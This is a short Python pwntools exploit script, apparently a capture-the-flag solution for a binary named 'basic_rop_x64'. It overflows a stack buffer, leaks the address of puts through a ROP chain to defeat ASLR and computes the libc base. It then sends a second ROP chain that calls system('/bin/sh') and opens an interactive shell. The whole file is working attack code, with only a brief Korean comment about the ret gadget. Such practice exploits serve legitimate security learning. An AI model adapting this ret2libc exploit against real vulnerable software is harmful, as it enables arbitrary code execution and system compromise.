from pwn import *

#context.log_level = 'debug'

p = process('./basic_rop_x64')
e = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')

# Gadget
ret = 0x4005a9
pop_rdi_ret = 0x400883

puts_plt = e.plt['puts']
puts_got = e.got['puts']
main = e.symbols['main']

payload = b"x"*0x48
payload += p64(ret) # 이거 안 써주니까 익스 안됨
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.send(payload)

p.recvuntil(b"x"*0x40)
puts_addr = u64(p.recvn(6) + b'\x00\x00')
print(hex(puts_addr))

libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system'] #0x50d60 
binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
print(hex(binsh))

payload = b"i"*0x48
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(system_addr)
p.send(payload)


p.interactive()